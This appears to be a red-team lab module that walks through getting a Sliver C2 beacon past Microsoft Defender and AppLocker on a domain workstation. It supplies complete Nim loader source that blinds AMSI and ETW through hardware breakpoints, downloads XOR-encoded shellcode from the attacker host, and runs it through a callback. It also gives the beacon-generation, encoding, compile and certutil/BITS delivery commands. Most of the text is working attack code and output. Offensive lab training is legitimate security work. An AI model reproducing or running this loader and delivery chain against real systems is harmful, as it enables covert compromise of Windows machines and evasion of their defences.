# 02 - Initial Access: Get Your Beacon Past Defender

## Scenario

You have got `CORP\vamsi`, the domain user on the victim machine, to download a file from a page you control. Maybe through a phishing email, maybe through a fake internal IT notification. The delivery method does not matter for this module. What matters is: the file is now on `WORKSTATION01` and vamsi is about to run it.

The machine has:
- Microsoft Defender running with real-time scanning turned on
- AppLocker enforcing default executable rules
- No antivirus exclusions anywhere

Both of these will try to stop your program from running. Defender checks whether your file is malicious. AppLocker checks whether your program is even allowed to run on this machine. You need to get past both of them.

This module shows you three methods to do that. Method 1 is the direct approach, good for a lab. Method 2 is the stealth approach, used in real engagements when Method 1 gets caught. Method 3 is the social engineering approach, where the victim thinks they are opening a normal document.

Read all three methods even if you plan to only run one. Each one teaches you a different concept.

## Objective

Get a live Sliver beacon running as `CORP\vamsi` on `WORKSTATION01` with Defender active and AppLocker enforced.

---

## Before You Write Any Code, Understand What You Are Up Against

If you skip this section and jump straight to the commands, you will follow the steps, something will go wrong, and you will have no idea why. This section explains exactly what Defender and AppLocker are doing so that every command you run later makes sense.

---

## How Defender Works

Defender is the antivirus that comes built into Windows. It does not just scan files once. It watches your program at three separate stages: when the file lands on disk, while the program is running, and through Microsoft's cloud servers. Each stage is a different type of check.

### Stage 1: The File Lands on Disk

The moment your file is saved to the victim machine, Defender scans it. This happens before anyone opens it. There are three checks at this stage.

**Check 1: Is this file already known to be malicious?**

Defender keeps a database of millions of known malicious files. Each file in that database is identified by its hash, which is a unique identifier calculated from the file's bytes. Think of it like a fingerprint. No two different files produce the same hash.

The moment your file lands on disk, Defender calculates its hash and checks that hash against the database. If it finds a match, Defender deletes the file immediately. The user never gets to run it.

This is why you never use public attack tools directly. Standard Metasploit payloads, public Mimikatz builds, known remote access tools, all of them are in every Defender database. They get deleted on contact.

This is why you write your own loader in Nim from scratch. Every time you compile Nim code, the resulting binary has a different internal structure and a different hash. Defender checks the hash, finds no match, and moves to the next check.

**Check 2: Does the file contain suspicious patterns?**

Even if the file has a brand new hash, Defender reads through the file's bytes looking for known bad patterns inside it. This works like a spam filter. A spam filter does not just block emails from known spam senders. It also reads the email text and looks for phrases that appear in spam, like "claim your prize now". Defender does the same thing with file bytes.

Raw shellcode has a recognisable byte pattern. It is dense, high-entropy data with no readable structure. Defender knows what it looks like. If your shellcode is sitting inside your program as raw unmodified bytes, Defender will find it.

This is why you XOR-encrypt the shellcode before storing it. XOR encryption scrambles the bytes so they look like random noise. Defender's pattern check sees nothing it recognises.

**Check 3: What Windows functions does the program use?**

Every Windows executable file contains a list of the Windows system functions it calls. This list is called the import table. Notepad's import table contains file reading and writing functions. A media player's import table contains audio and video functions.

Defender reads this list before running your program. There is a specific combination of functions that almost only appears in shellcode loaders: allocate a block of memory, write data into it, make it executable, then run it. If Defender sees those functions listed together, it flags your file before it even runs.

This is why your loader does not list those functions in its import table at all. Instead of listing them upfront, your loader finds them at runtime by looking them up by name after the program has already started. From Defender's point of view, the import table looks normal. The dangerous functions only appear in memory after execution begins.

### Stage 2: The Program Is Running

Passing the file scan does not mean you are safe. Defender keeps watching your program the whole time it is running. This is the harder problem.

**Memory that is writable and executable at the same time**

When any program needs to store data in RAM, it has to tell Windows what that memory will be used for. There are three permissions: readable, writable, and executable.

Readable memory is for data you read. Writable memory is for data you write. Executable memory is memory where the CPU can run the bytes as actual code.

Normal programs do not need memory that is both writable and executable at the same time. You write your code at compile time, not while the program is running. So there is no reason for a normal program to write code into memory and then immediately run it.

Shellcode loaders always need to do exactly that. They write the shellcode bytes into memory and then run them. This pattern, writable-then-executable in the same region, is one of the most reliable signals that a program is loading shellcode. Defender watches for it and kills any process that triggers it.

Your loader avoids this by separating the two steps. First, it asks Windows for memory that is writable only, not executable. It writes the shellcode into that memory. Then, in a completely separate Windows API call, it changes that memory to executable and removes the write permission. Writable first, then executable separately. The memory is never both at the same time.

This two-step approach is the same pattern browsers use when they compile JavaScript to machine code at runtime. Defender sees it and treats it as normal behaviour.

**Writing code into another running process**

One well-known attack technique is to write your shellcode into the memory of another program that is already running, like Windows Explorer or Notepad, and then trigger that program to run it. Your code ends up running inside a legitimate Microsoft process.

Defender recognises this technique and has signatures for it. Your loader does not do this at all. It runs the shellcode inside its own process. That keeps things simpler and avoids those injection signatures.

**ETW: Windows keeps a log of everything every process does**

Windows has a logging system called ETW, which stands for Event Tracing for Windows. Think of it as a diary that Windows writes automatically. Every time your program asks for memory, Windows logs it. Every time your program makes a network connection, Windows logs it. Every time your program does something with executable memory, Windows logs it. Defender reads this diary in real time.

The old technique to stop this logging was simple. Find the ETW logging function inside a Windows system DLL file and overwrite its first few bytes with a return instruction, which makes the function do nothing. This worked for many years.

Defender in 2026 has a counter for this. It periodically takes a snapshot of the bytes inside Windows system files and compares them to the original. If any bytes have been changed, Defender sees the modification and kills your process.

Your loader uses a different technique called hardware breakpoints. The CPU chip itself has four special registers named DR0, DR1, DR2, and DR3. These were designed for debuggers. You can point one of these registers at a memory address and tell the CPU: whenever execution reaches that address, stop and let me handle it.

Your loader points DR0 at the ETW logging function. When Windows tries to call that function, the CPU stops before the function body even starts, hands control to your exception handler, and your handler tells the CPU to skip the function and return. No bytes of any Windows system file are changed. Defender's snapshot check sees clean, unmodified files. But the ETW logging function never runs.

**AMSI: the scanner for code that runs in memory**

AMSI stands for Antimalware Scan Interface. It was created to solve a specific problem. An attacker who never saves anything to disk, who just runs attack commands directly through PowerShell or runs tools through a beacon, would never trigger Defender's file scanner. Nothing is ever written to disk for Defender to scan.

AMSI plugs this gap. It sits inside PowerShell, the .NET runtime, and other scripting systems. Before PowerShell runs any command, AMSI sends the text of that command to Defender first. If Defender decides it looks malicious, execution stops before any line runs.

This will matter in later modules when you start running enumeration and credential tools through your Sliver session. Without dealing with AMSI, those tools would get caught immediately.

Your loader uses the same hardware breakpoint technique on AMSI that it uses on ETW. It points DR1 at the AMSI scan function. When something tries to trigger a scan, the CPU stops, your handler returns a fake "nothing suspicious found" result, and execution continues. AMSI never actually scans anything.

**Timing: the speed and order of actions**

Defender has behavioural rules that look at chains of actions. A program that connects to a remote server, then immediately downloads data, then immediately allocates executable memory, then immediately runs it, that specific sequence at machine speed, is a well-known shellcode loader pattern. Defender knows it.

Your loader puts short pauses, using `sleep()` calls, between each of those steps. The same sequence still happens, but spread out over time rather than at full machine speed. It no longer matches the timing signature Defender is looking for.

### Stage 3: Cloud Analysis

When Defender sees a file it has never seen before, it can send information about that file up to Microsoft's cloud servers. The cloud servers can run the file in a controlled environment and push new detection rules back to every Defender installation in the world within minutes.

In your lab, the file comes from a private IP address on your local network, not from the internet. Defender is less aggressive about sending files from local sources to the cloud. For this lab, this is not a major concern.

### Summary: Why Each Part of the Loader Exists

Every decision in the loader code maps to one of the detection stages above.

1. **Written in Nim from scratch**: the binary has a unique hash that is not in any database
2. **Shellcode is XOR-encrypted**: the static byte pattern check finds random-looking noise, not shellcode
3. **Shellcode is fetched from Kali at runtime**: the dangerous bytes never sit on the victim's disk
4. **Memory is set writable first, then executable separately**: the write-and-execute detection never triggers
5. **Hardware breakpoints on ETW and AMSI**: the logging and scanning functions are intercepted without modifying any system file bytes
6. **Shellcode is run by passing it as a callback to a normal Windows function**: this avoids the pattern of creating a new thread just to run shellcode
7. **Short sleeps between each step**: the timing signature does not match

---

## How AppLocker Works

AppLocker is a completely separate system from Defender. Defender tries to detect whether a program is malicious. AppLocker does not check for malicious behaviour at all. It only asks one question: is this program in a location that is allowed to run programs, and is it signed by a trusted publisher?

The default AppLocker rules in a corporate Windows environment are:
- Programs inside `C:\Windows\` are allowed to run
- Programs inside `C:\Program Files\` are allowed to run
- Everything else is blocked

So if your loader downloads to `C:\Users\vamsi\Downloads\loader.exe`, AppLocker blocks it before it even starts. The user sees a message saying the program is blocked by group policy. Nothing runs.

You have three ways around this.

**Option A: Place your loader in a path AppLocker trusts.**
`C:\Windows\Temp\` is inside `C:\Windows\`, so AppLocker allows programs to run from there. A standard user like `vamsi` has write permission to that folder because it is a temporary files directory, not a protected system directory. If your loader lands there, AppLocker allows it to run.

**Option B: Use a Microsoft-signed Windows tool to download the file.**
`certutil.exe` is a Windows tool that ships in `C:\Windows\System32\` and is signed by Microsoft. AppLocker trusts it completely. Certutil has a built-in feature to download files from a URL. You run certutil on the victim machine to download your loader directly into `C:\Windows\Temp\`, then run it from there. AppLocker never blocks certutil and never checks what certutil downloads.

**Option C: Do not run an executable at all. Use DLL sideloading.**
AppLocker's default configuration has no rules for DLL files. It only controls executables and scripts. A DLL is a code library that gets loaded by another program. If your malicious code is inside a DLL, and a legitimate Microsoft program loads that DLL as part of its normal startup, AppLocker does not check the DLL at all. Your code runs inside a trusted process and AppLocker never sees it. This is Method 2 of this module.

---



## Part 1: Setting Up Sliver on Kali

Revert your Kali VM to the `baseline-clean` snapshot before starting.

### 1.1 Start the Sliver Daemon and Console

Sliver runs as a background service on Kali. The install script already configured it as a systemd service. Every time you start a module, start it like this:

```bash
# Start the daemon if it is not already running
sudo systemctl start sliver

# Make it start automatically after revert/reboot
sudo systemctl enable sliver

# Connect to the running daemon with the Sliver client
sliver
```

You will see the Sliver ASCII art banner and drop into the interactive console:

```
    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ...

All your sliver are belong to us...

sliver >
```

Leave this terminal open. You will run all Sliver commands from this `sliver >` prompt.

### 1.2 Start the HTTPS C2 Listener

Your beacon on the victim machine needs somewhere to connect to. You set that up on Kali first. The beacon will send its check-in requests to Kali over HTTPS on port 443. HTTPS is a good choice because port 443 is the standard port for normal web traffic. A connection on port 443 looks less suspicious to anyone monitoring the network than a connection on an unusual port.

```
sliver > https --lhost 192.168.10.10 --lport 443
```

You should see:

```
[*] Starting HTTPS :443 listener ...
[*] Successfully started job #1
```

Sliver is now listening on `192.168.10.10:443`. When your beacon on the victim machine sends check-in requests to that address, Sliver receives them and gives you an interactive session where you can run commands.

Verify the listener is up:

```
sliver > jobs
```

```
 ID  Name   Protocol  Port  Domains
==  =====  ========  ====  =======
 1   https  tcp       443
```

### 1.3 Generate the Beacon Shellcode

In the old workflow, you had to use a separate tool called msfvenom to generate a small stub that then downloaded the actual Sliver implant from a second listener. That was two separate servers, two separate payloads, and a dependency on Metasploit. It was more complex and had more things that could go wrong.

Sliver can do this in one step. The `generate beacon` command builds the complete Sliver implant and outputs it as raw shellcode. There is no download step, no second listener, nothing extra. Your Nim loader picks up this one file, decodes it in memory, and runs it. The implant then connects back to your HTTPS listener on port 443.

Run this inside the Sliver console:

```
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

> **About the shellcode encoder prompt:** If you leave out `--shellcode-encoder none`, Sliver shows an interactive menu asking you to pick an encoder: `none`, `shikata_ga_nai`, `xor`, or `xor_dynamic`. These are Sliver's built-in obfuscation options for the raw shellcode output. In this module you are handling obfuscation yourself with XOR in the Python encoder script, so you always want `none` here. Adding `--shellcode-encoder none` to the command skips the interactive menu completely.

What each flag does:

| Flag | What it does |
|------|--------------|
| `generate beacon` | Tells Sliver to build a beaconing implant. A beacon checks in on a schedule rather than keeping a permanent connection open. |
| `--http https://192.168.10.10:443` | The address the beacon will connect to. The `--http` flag handles both HTTP and HTTPS. You tell it which protocol to use by including `https://` or `http://` at the start of the URL. |
| `--os windows` | The target operating system. |
| `--arch amd64` | 64-bit Windows target. |
| `--format shellcode` | Output the implant as raw shellcode bytes, not a full Windows executable. This is the format your Nim loader needs. |
| `--shellcode-encoder none` | Skip Sliver's built-in shellcode encoding. Your Nim loader applies your own XOR encoding, so you do not need Sliver's encoder on top of that. Without this flag, Sliver shows an interactive prompt asking you to pick an encoder. |
| `--skip-symbols` | Remove debug information from the output. This makes the file smaller and removes readable function names that could be matched against. |
| `--seconds 30` | How often the beacon checks in. Every 30 seconds in this case. |
| `--jitter 10` | Add a random delay of up to 10 seconds to each check-in. So the beacon checks in every 30 to 40 seconds instead of exactly every 30 seconds. This makes the timing less predictable. |
| `--save /tmp/beacon.bin` | Save the generated shellcode to this file path on Kali. |

Sliver compiles a full Go implant and converts it into shellcode. This process takes between 30 and 90 seconds. You will see a progress message:

```
[*] Generating new windows/amd64 beacon implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 47s
[*] Implant saved to /tmp/beacon.bin
```

Check the output file:

```bash
ls -la /tmp/beacon.bin
```

The output file will be around 8 to 15 MB in size. This is larger than a small stub payload, because the file contains the complete Sliver implant, not just a download helper. That is why you encode it and serve it from Kali's HTTP server at runtime, rather than embedding it directly inside the Nim loader. The Nim loader stays small. The shellcode sits on Kali and gets fetched when needed.

> **Why use beacon mode instead of session mode?**
> Session mode keeps a permanent open network connection between the victim and your Kali machine. That permanent connection is visible to anyone watching network traffic. Beacon mode is different. The implant connects, sends its check-in, and then disconnects. Between check-ins, there is no active connection at all. On a network with traffic monitoring, short periodic connections look much more like normal application background traffic than a socket that stays open all day. For real engagements you should always use beacon mode. This lab uses 30-second intervals so you do not have to wait long between commands.

---

## Part 2: XOR-Encode the Shellcode

You cannot put the raw shellcode file directly into your Nim loader and ship it to the victim. Defender's file scanner would read through the bytes, recognise the shellcode pattern, and flag the file before it ever runs.

The solution is to encrypt the shellcode with a simple algorithm called XOR. XOR encryption works by taking each byte of the shellcode and combining it with a key byte using a bitwise XOR operation. The result looks like random data with no recognisable pattern. When the loader runs on the victim machine, it performs the same XOR operation again to reverse the encryption and get the original shellcode back.

XOR encryption is simple enough to implement in a few lines of code and fast enough to run in milliseconds. More advanced encryptions like AES would also work, but XOR is sufficient to defeat static pattern scanning, which is what you are trying to avoid at this stage.

On Kali, create this Python script to encode the shellcode:

```bash
nano /tmp/xor_encode.py
```

Paste this:

```python
#!/usr/bin/env python3
import sys

# Read the raw shellcode
with open('/tmp/beacon.bin', 'rb') as f:
    shellcode = f.read()

# XOR key - you can change this to any value 1-255
# Do not use 0 (XOR with 0 does nothing)
XOR_KEY = 0xAB

# XOR every byte
encoded = bytes([b ^ XOR_KEY for b in shellcode])

# Write the encoded shellcode
with open('/tmp/beacon_encoded.bin', 'wb') as f:
    f.write(encoded)

# Also print as a Nim byte array you can paste into code
print(f"# XOR key: 0x{XOR_KEY:02X}")
print(f"# Original size: {len(shellcode)} bytes")
print(f"var shellcodeEncoded: array[{len(encoded)}, byte] = [")
hex_values = [f"0x{b:02X}" for b in encoded]
# Print in rows of 16
for i in range(0, len(hex_values), 16):
    row = hex_values[i:i+16]
    print("  " + ", ".join(row) + ",")
print("]")
```

Run it:

```bash
python3 /tmp/xor_encode.py
```

You will see output like:

```
# XOR key: 0xAB
# Original size: 896 bytes
var shellcodeEncoded: array[896, byte] = [
  0xFC, 0x2B, 0x4A, ...
  ...
]
```

Verify the output file exists:

```bash
ls -la /tmp/beacon_encoded.bin
```

You now have the XOR-encoded shellcode saved to `/tmp/beacon_encoded.bin`. Defender cannot identify it from a file scan because it looks like random bytes with no pattern.

**Why XOR and not something stronger like AES?** XOR requires no libraries, runs in a few microseconds, and produces output that looks statistically random. AES would also work but you would need to include an AES library and write key management code. The goal at this stage is only to defeat static file scanning. XOR achieves that. More advanced loaders use AES or RC4, but for defeating a pattern-based scanner, XOR is enough.

---

## Part 3: Method 1 - Standalone Nim EXE Loader

This is the straightforward method. You compile a Windows `.exe` file on Kali, copy it to the victim machine into `C:\Windows\Temp\` (a folder that AppLocker trusts), and run it. The loader does the following things in order: installs hardware breakpoints on ETW and AMSI so Windows does not log what it is doing, fetches the encoded shellcode from Kali over HTTP, decodes it in memory, puts it in a memory region set to read-write, then changes that region to executable and runs it through a standard Windows callback function.

### 3.1 Set Up an HTTP Server on Kali to Serve the Shellcode

The Nim loader on the victim machine will fetch the encoded shellcode file from Kali at runtime. You need an HTTP server on Kali to serve that file. Python has a built-in one that works perfectly for this:

```bash
cd /tmp
python3 -m http.server 8888
```

This starts a web server that makes all files in `/tmp/` available over HTTP on port 8888. Your loader will request `http://192.168.10.10:8888/beacon_encoded.bin` when it runs on the victim.

Leave this terminal running with the server. Open a new terminal for the next steps.

### 3.2 Write the Nim Loader

On Kali, create the loader source file:

```bash
nano /tmp/loader.nim
```

Paste the code below. Read through the comments inside the code as you paste. Each section has a comment block explaining what that section does and why it is written that way. The comments are important: this is where the actual learning happens.

```nim
import winim/lean
import winim/winstr
import winim/utils
import os
import httpclient
import strutils

# ============================================================
# CONFIGURATION
# Change these to match your Kali IP and XOR key
# ============================================================
const KALI_IP    = "192.168.10.10"
const KALI_PORT  = "8888"
const SC_PATH    = "/beacon_encoded.bin"
const XOR_KEY    = 0xAB.byte

# ============================================================
# WHY NOT MEMORY PATCHING
# The old approach was: overwrite the first bytes of
# AmsiScanBuffer and EtwEventWrite with a RET instruction.
# Defender in 2026 has SIGNATURES for those exact patch bytes.
# It also monitors VirtualProtect calls on amsi.dll and
# ntdll.dll memory. If you write 0xC3 to EtwEventWrite,
# Defender's periodic memory integrity scans catch it.
#
# Instead, we use HARDWARE BREAKPOINTS (HWBP).
# These use the CPU's debug registers (DR0-DR3) to intercept
# function execution WITHOUT modifying a single byte of code.
# Defender's memory integrity checks see untouched DLL code.
# ============================================================

# Global variables to store the addresses we want to intercept
var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

# ============================================================
# VECTORED EXCEPTION HANDLER (VEH)
# When the CPU hits a hardware breakpoint, it raises a
# STATUS_SINGLE_STEP exception. This handler catches it.
#
# For AmsiScanBuffer: we change the return value in RAX
# to E_INVALIDARG (0x80070057) and skip the function by
# setting RIP to the return address on the stack.
#
# For EtwEventWrite: we set RAX to 0 (STATUS_SUCCESS)
# and skip the function the same way.
#
# ZERO bytes of amsi.dll or ntdll.dll are modified.
# ============================================================
proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {.stdcall.} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord

  # Only handle hardware breakpoint exceptions
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH

  let faultAddr = cast[pointer](ctx.Rip)

  if faultAddr == amsiScanBufferAddr:
    # AmsiScanBuffer was called. We need to:
    # 1. Set RAX to E_INVALIDARG so the caller thinks the scan
    #    returned an error and treats the content as clean
    # 2. Set RIP to the return address (pop it from the stack)
    #    so the function is skipped entirely
    ctx.Rax = cast[DWORD64](0x80070057)
    # Return address is at the top of the stack (RSP points to it)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    # Pop the return address off the stack (adjust RSP)
    ctx.Rsp = ctx.Rsp + 8
    # Set the Resume Flag so we do not re-trigger the breakpoint
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION

  elif faultAddr == etwEventWriteAddr:
    # EtwEventWrite was called. Skip it and return STATUS_SUCCESS.
    ctx.Rax = 0  # STATUS_SUCCESS
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION

  # Not our breakpoint, pass to next handler
  return EXCEPTION_CONTINUE_SEARCH

# ============================================================
# SET HARDWARE BREAKPOINTS
# Uses CPU debug registers DR0 and DR1 to set execution
# breakpoints on AmsiScanBuffer and EtwEventWrite.
# No memory is modified. No VirtualProtect calls on DLLs.
# ============================================================
proc setHardwareBreakpoints() =
  # Resolve AmsiScanBuffer address
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")

  # Resolve EtwEventWrite address
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")

  # Register our VEH BEFORE setting breakpoints
  # Priority 1 = first handler in the chain
  discard AddVectoredExceptionHandler(1, hwbpHandler)

  # Get the current thread context (must include debug registers)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS

  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)

  # DR0 = AmsiScanBuffer address (breakpoint 0)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)

  # DR1 = EtwEventWrite address (breakpoint 1)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)

  # DR7 controls which breakpoints are active and their type.
  # Bit 0 = enable DR0 (local)
  # Bit 2 = enable DR1 (local)
  # Bits 16-17 = DR0 condition: 00 = break on execution
  # Bits 18-19 = DR0 length: 00 = 1 byte
  # Bits 20-21 = DR1 condition: 00 = break on execution
  # Bits 22-23 = DR1 length: 00 = 1 byte
  # Result: 0x00000005 (bits 0 and 2 set, all conditions = execute)
  ctx.Dr7 = 0x00000005

  # Apply the modified context back to the thread
  discard SetThreadContext(hThread, addr ctx)

# ============================================================
# SHELLCODE RUNNER
# 1. Fetch XOR-encoded shellcode from Kali over HTTP
# 2. Decode it in memory
# 3. Allocate RW memory (NOT RWX)
# 4. Write shellcode into RW memory
# 5. Flip memory to RX
# 6. Execute via callback (NOT CreateThread)
#
# WHY NOT CreateThread:
# CreateThread is heavily monitored by Defender and EDR.
# The pattern VirtualAlloc -> memcpy -> VirtualProtect ->
# CreateThread is a textbook shellcode injection signature.
#
# Instead, we use EnumSystemLocalesA. This is a legitimate
# Windows API that enumerates system locales by calling a
# callback function for each locale. We pass the address
# of our shellcode as the callback. Windows calls our
# shellcode as if it were a normal callback function.
# No new thread is created. The shellcode runs in the
# context of the existing thread via a legitimate API call.
# ============================================================
proc runShellcode() =
  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH

  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return

  if encoded.len == 0:
    return

  # XOR decode
  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY

  let scLen = shellcode.len.SIZE_T

  # Allocate RW memory
  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil:
    return

  # Copy decoded shellcode into RW memory
  copyMem(mem, addr shellcode[0], shellcode.len)

  # Wipe the shellcode from the Nim heap immediately
  # so only the VirtualAlloc region contains it
  zeroMem(addr shellcode[0], shellcode.len)

  # Brief sleep to break behavioral timing patterns
  sleep(500)

  # Flip to RX (never RWX at any point)
  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)

  # Execute via callback instead of CreateThread
  # EnumSystemLocalesA calls our shellcode address as if
  # it were a locale enumeration callback function.
  # From Defender's perspective, a standard Windows API
  # is calling a function pointer - not a new thread
  # being spawned to execute shellcode.
  discard EnumSystemLocalesA(
    cast[LOCALE_ENUMPROCA](mem),  # callback = shellcode address
    LCID_INSTALLED                 # flag: enumerate installed locales
  )

# ============================================================
# ENTRY POINT
# ============================================================
when isMainModule:
  # Step 1: Install hardware breakpoints on AMSI and ETW
  # This uses CPU debug registers - no memory patching
  # No VirtualProtect on DLL code pages
  # No byte modifications to amsi.dll or ntdll.dll
  setHardwareBreakpoints()

  # Step 2: Run the shellcode
  # Uses callback execution, not CreateThread
  runShellcode()
```

Save the file (`Ctrl+O`, Enter, `Ctrl+X`).

### 3.3 Compile the Loader on Kali

```bash
nim c \
  -d:mingw \
  -d:release \
  --opt:size \
  --app:gui \
  --passL:-s \
  --cpu:amd64 \
  -o:/tmp/loader.exe \
  /tmp/loader.nim
```

What each flag does:

| Flag | What It Does |
|------|-------------|
| `-d:mingw` | Cross-compile for Windows. You are compiling on Kali (Linux) but producing a Windows executable. The MinGW toolchain handles the conversion. |
| `-d:release` | Build in release mode. Removes debug output and enables code optimisations. |
| `--opt:size` | Optimise the output for the smallest possible file size. A smaller binary takes less time to scan and contains less data for Defender to analyse. |
| `--app:gui` | Produce a GUI application with no console window. This is critical for two reasons. First, when the victim double-clicks the file, no black command prompt window flashes on screen. Second, when run from a CMD prompt, the process detaches immediately — CMD does not block waiting for it to exit. A console binary compiled with `--app:console` will freeze the terminal because `EnumSystemLocalesA` blocks until the shellcode returns, which never happens while the beacon is alive. |
| `--passL:-s` | Pass the `-s` flag to the linker. This removes all debug symbols and function name information from the binary. Defender cannot match function names it cannot read. |
| `--cpu:amd64` | Produce a 64-bit binary. The victim machine runs 64-bit Windows. |
| `-o:/tmp/loader.exe` | Set the output file name and path. |

Compilation takes 10 to 30 seconds. You should see:

```
CC: loader
Hint: /tmp/loader.exe [SuccessX]
```

Check the output:

```bash
ls -la /tmp/loader.exe
file /tmp/loader.exe
```

The `file` command will confirm the output is a 64-bit Windows executable. The file size should be under 300 KB. Because debug symbols were stripped, there are no readable function names inside the binary for Defender to analyse.

### 3.4 Deliver the Loader to the Victim

The HTTP server on Kali (port 8888) is already serving files from `/tmp/`. Your loader is saved at `/tmp/loader.exe`, so it is reachable at `http://192.168.10.10:8888/loader.exe`.

On the victim machine, log in as `CORP\vamsi` and open a command prompt or PowerShell. You do not need administrator rights for this step.

Use `certutil.exe` to download the loader. Certutil is a Microsoft tool that ships with Windows, lives in `C:\Windows\System32\`, and is signed by Microsoft. AppLocker trusts it without question. Certutil can download a file from an HTTP URL and save it to disk:

```cmd
certutil.exe -urlcache -split -f http://192.168.10.10:8888/loader.exe C:\Windows\Temp\loader.exe
```

What the flags mean:
- `-urlcache -split -f` tells certutil to fetch the file from the URL. The `-f` flag forces a fresh download even if the URL is already in the cache. The `-split` flag handles any file size.
- The first argument after the flags is the URL. The second is where to save the file.

You should see:

```
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Confirm it downloaded:

```cmd
dir C:\Windows\Temp\loader.exe
```
```powershell
Start-BitsTransfer -Source 'http://192.168.10.10:8888/loader.exe' -Destination 'C:\Windows\Temp\loader.exe'
```
### 3.5 Run the Loader

```cmd
C:\Windows\Temp\loader.exe
```

The CMD prompt returns immediately. No window appears, no output, no blinking cursor. That is correct and expected. The loader is compiled as a GUI application (`--app:gui`), so Windows launches it as a background process and does not wait for it to finish.

In the background it is:
1. Installing hardware breakpoints on ETW and AMSI — no memory patching
2. Connecting to `192.168.10.10:8888` and fetching `beacon_encoded.bin`
3. XOR-decoding the Sliver beacon shellcode in memory
4. Allocating RW memory, writing the decoded shellcode, flipping to RX
5. Executing the shellcode via `EnumSystemLocalesA` callback — the beacon starts running

If you used `--app:console` instead, the CMD window would freeze and sit there doing nothing for as long as the beacon is alive. That is a red flag for any user who launched it. `--app:gui` avoids this entirely.

The beacon shellcode contains the complete Sliver implant. It immediately starts making HTTPS check-ins to `192.168.10.10:443`.

### 3.6 Catch the Beacon in Sliver

Back in your Sliver console on Kali, within 30 to 40 seconds you will see a line appear:

```
[*] Beacon 0e66afcc COMPULSORY_DOORKNOB - 192.168.10.20:57584 (WORKSTATION01) - windows/amd64
```

This means the beacon checked in. The name like `COMPULSORY_DOORKNOB` is randomly generated by Sliver for each implant.

> **Important:** Do not run `sessions`. Beacons and sessions are different things in Sliver. A session is a permanent open connection. A beacon checks in on a schedule, sends results, and disconnects. If you type `sessions` you will see "No sessions" even when everything is working. The correct command is `beacons`.

List your beacons:

```
sliver > beacons
```

You will see something like:

```
 ID         Name                  Transport  Hostname       Username    Operating System  Last Check-In  Next Check-In
========== ==================== ========== ============= =========== ================ ============= =============
 0e66afcc   COMPULSORY_DOORKNOB   http(s)    WORKSTATION01  CORP\vamsi  windows/amd64     15s            19s
```

Open the beacon:

```
sliver > use 0e66afcc
```

Replace `0e66afcc` with your actual beacon ID. The prompt changes:

```
sliver (COMPULSORY_DOORKNOB) >
```

Run a command:

```
sliver (COMPULSORY_DOORKNOB) > whoami
```

You will not see the output immediately. Sliver queues the command and waits for the next check-in to deliver it. You will see:

```
[*] Tasked beacon COMPULSORY_DOORKNOB (whoami)
```

Wait up to 30 seconds. When the beacon checks in next, it runs the queued command and sends the result back:

```
corp\vamsi
```

Also verify which user account the beacon is running under:

```
sliver (COMPULSORY_DOORKNOB) > pwd
```

After the next check-in you will see something like:

```
[*] Current Token ID: CORP\vamsi

[*] C:\Users\vamsi
```

The `Current Token ID` line is Sliver telling you which Windows user account the beacon process is running as. `CORP\vamsi` confirms the beacon is running in the context of the logged-in user. The path below it is the working directory.

You now have a working Sliver beacon running as `CORP\vamsi` on `WORKSTATION01`, bypassing both Defender and AppLocker. Method 1 is complete.

### 3.7 Troubleshooting

**Defender deletes loader.exe before you can run it.**

This means Defender matched something in the file during the static scan. The most likely cause is that the XOR key you used is one Defender has seen before. Fix: change the `XOR_KEY` constant to a different value, re-run the XOR encoder, and recompile the loader. Changing the key changes the encrypted shellcode bytes and changes the loader binary, which gives it a different hash.

**The loader runs but no beacon appears in Sliver after 30 to 40 seconds.**

Check the HTTP server terminal on Kali (port 8888). Look at the access log output. Did a request come in for `beacon_encoded.bin`? If yes, the loader started and fetched the shellcode. The problem is with the Sliver listener. Check it:

```
sliver > jobs
```

If Job 1 is not listed, the HTTPS listener stopped. Start it again:

```
sliver > https --lhost 192.168.10.10 --lport 443
```

If the HTTP server shows no request came in at all, the loader crashed before reaching the fetch step. The most common cause is the hardware breakpoint setup failing. Check in Task Manager whether the process even started.

**Defender catches the loader while it is running.**

